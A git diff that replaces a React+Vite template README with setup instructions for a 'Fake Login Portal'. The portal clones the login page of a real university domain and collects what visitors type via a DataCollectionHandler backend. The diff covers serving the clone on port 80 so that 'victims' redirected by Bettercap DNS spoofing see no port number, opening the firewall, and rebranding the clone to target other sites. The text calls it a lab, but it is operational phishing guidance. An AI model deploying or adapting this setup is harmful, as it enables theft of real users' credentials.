@@ -1,73 +1,153 @@
-# React + TypeScript + Vite
+# Frontend Setup - Fake Login Portal
 
-This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
+## Quick Start
 
-Currently, two official plugins are available:
+### 1. Install Dependencies
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) (or [oxc](https://oxc.rs) when used in [rolldown-vite](https://vite.dev/guide/rolldown)) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
-
-## React Compiler
-
-The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://react.dev/learn/react-compiler/installation).
-
-## Expanding the ESLint configuration
-
-If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:
-
-```js
-export default defineConfig([
-  globalIgnores(['dist']),
-  {
-    files: ['**/*.{ts,tsx}'],
-    extends: [
-      // Other configs...
-
-      // Remove tseslint.configs.recommended and replace with this
-      tseslint.configs.recommendedTypeChecked,
-      // Alternatively, use this for stricter rules
-      tseslint.configs.strictTypeChecked,
-      // Optionally, add this for stylistic rules
-      tseslint.configs.stylisticTypeChecked,
-
-      // Other configs...
-    ],
-    languageOptions: {
-      parserOptions: {
-        project: ['./tsconfig.node.json', './tsconfig.app.json'],
-        tsconfigRootDir: import.meta.dirname,
-      },
-      // other options...
-    },
-  },
-])
+```bash
+yarn install
 ```
 
-You can also install [eslint-plugin-react-x](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-x) and [eslint-plugin-react-dom](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-dom) for React-specific lint rules:
+### 2. Configure Backend URL
 
-```js
-// eslint.config.js
-import reactX from 'eslint-plugin-react-x'
-import reactDom from 'eslint-plugin-react-dom'
+Edit `src/utils/DataCollectionHandler.ts`:
 
-export default defineConfig([
-  globalIgnores(['dist']),
-  {
-    files: ['**/*.{ts,tsx}'],
-    extends: [
-      // Other configs...
-      // Enable lint rules for React
-      reactX.configs['recommended-typescript'],
-      // Enable lint rules for React DOM
-      reactDom.configs.recommended,
-    ],
-    languageOptions: {
-      parserOptions: {
-        project: ['./tsconfig.node.json', './tsconfig.app.json'],
-        tsconfigRootDir: import.meta.dirname,
-      },
-      // other options...
-    },
-  },
-])
+```typescript
+const API_URL = 'http://YOUR_MACHINE_IP:5000';
 ```
+
+**Find your machine's IP:**
+```bash
+# Linux/Mac
+ip addr show | grep inet
+# or
+ifconfig | grep inet
+
+# Windows
+ipconfig
+```
+
+Example: If your IP is `192.168.1.100`:
+```typescript
+const API_URL = 'http://192.168.1.100:5000';
+```
+
+### 3. Build for Production
+
+```bash
+yarn build
+```
+
+This creates optimized files in the `dist/` folder.
+
+### 4. Serve the Application
+
+**Option 1: Using Python (Recommended for Lab)**
+```bash
+cd dist
+sudo python3 -m http.server 80
+```
+
+**Option 2: Using serve package**
+```bash
+npm install -g serve
+sudo serve -s dist -l 80
+```
+
+**Option 3: Using nginx (Production)**
+```bash
+sudo apt install nginx
+sudo cp -r dist/* /var/www/html/
+sudo systemctl restart nginx
+```
+
+## Development Mode
+
+For development with hot reload:
+```bash
+yarn dev
+```
+
+Access at `http://localhost:5173`
+
+**Note:** Development mode won't work for the DNS spoofing lab. Always use production build.
+
+## Port Configuration
+
+### Why Port 80?
+- HTTP default port
+- Victims expect `http://ug.nsuk.edu.ng` (no port number)
+- Requires sudo/administrator privileges
+
+### Using Different Port
+If port 80 is unavailable:
+```bash
+sudo python3 -m http.server 8080
+```
+
+Victims must access: `http://ug.nsuk.edu.ng:8080`
+
+## Firewall Configuration
+
+Allow HTTP traffic:
+```bash
+# Ubuntu/Debian
+sudo ufw allow 80/tcp
+
+# CentOS/RHEL
+sudo firewall-cmd --add-port=80/tcp --permanent
+sudo firewall-cmd --reload
+```
+
+## Troubleshooting
+
+### Port 80 already in use
+```bash
+# Check what's using port 80
+sudo lsof -i :80
+
+# Stop Apache if installed
+sudo systemctl stop apache2
+
+# Stop nginx if installed
+sudo systemctl stop nginx
+```
+
+### Permission denied on port 80
+```bash
+# Must run with sudo
+sudo python3 -m http.server 80
+```
+
+### Can't connect from other devices
+1. Check firewall allows port 80
+2. Verify server is listening on `0.0.0.0` not `127.0.0.1`
+3. Confirm backend URL is correct in DataCollectionHandler.ts
+
+## File Structure
+
+```
+frontend/
+├── src/
+│   ├── components/     # React components
+│   ├── utils/          # DataCollectionHandler
+│   ├── Login.tsx       # Main login page
+│   └── index.css       # Styles
+├── dist/               # Production build (after yarn build)
+└── package.json        # Dependencies
+```
+
+## Customization
+
+### Change Target Domain
+The fake site mimics `ug.nsuk.edu.ng`. To target a different site:
+
+1. Update Bettercap DNS spoof domain
+2. Modify branding in `src/components/Right.tsx`
+3. Update logo URL in Right component
+4. Adjust colors in `src/index.css`
+
+### Styling
+- Colors: Edit `src/index.css` and component files
+- Logo: Update image URL in `Right.tsx`
+- Layout: Modify `Login.tsx` and component files
